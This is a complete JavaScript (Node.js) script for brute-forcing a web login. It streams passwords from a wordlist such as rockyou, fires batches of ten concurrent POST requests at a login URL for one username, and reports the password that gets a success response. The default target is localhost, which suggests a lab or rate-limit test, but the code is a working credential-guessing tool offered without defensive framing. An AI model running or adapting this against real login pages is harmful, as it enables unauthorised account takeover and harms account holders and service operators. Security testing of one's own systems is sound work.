import fs from "fs";
import readline from "readline";

const TARGET_URL = "http://localhost:3000/login";
const username = process.argv[2] ?? "alice";
const wordlistPath = process.argv[3] ?? "/usr/share/wordlists/rockyou-50.txt";
const CONCURRENCY = 10; 

async function tryPassword(password) {
  const res = await fetch(TARGET_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username, password }),
  });
  return { password, success: res.status === 200 };
}

async function runChunk(passwords) {
  return Promise.all(passwords.map(tryPassword));
}

async function bruteForce() {
  console.log(`🎯 Target : ${TARGET_URL}`);
  console.log(`👤 Username: ${username}`);
  console.log(`📖 Wordlist: ${wordlistPath}\n`);

  const rl = readline.createInterface({
    input: fs.createReadStream(wordlistPath, { encoding: "latin1" }),
    crlfDelay: Infinity,
  });

  let attempted = 0;
  let chunk = [];
  const startTime = Date.now();

  for await (const line of rl) {
    const password = line.trim();
    if (!password) continue;

    chunk.push(password);

    if (chunk.length >= CONCURRENCY) {
      const results = await runChunk(chunk);
      attempted += results.length;

      const found = results.find((r) => r.success);
      if (found) {
        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
        console.log(`\n✅ PASSWORD FOUND after ${attempted} attempts (${elapsed}s)`);
        console.log(`   Username : ${username}`);
        console.log(`   Password : ${found.password}`);
        process.exit(0);
      }

      process.stdout.write(`\r⏳ Tried ${attempted} passwords...`);
      chunk = [];
    }
  }

  // flush remaining chunk (wordlist end)
  if (chunk.length > 0) {
    const results = await runChunk(chunk);
    attempted += results.length;
    const found = results.find((r) => r.success);
    if (found) {
      console.log(`\n✅ PASSWORD FOUND: ${found.password} (after ${attempted} attempts)`);
      process.exit(0);
    }
  }

  console.log(`\n❌ Password not found after ${attempted} attempts.`);
}

bruteForce().catch(console.error);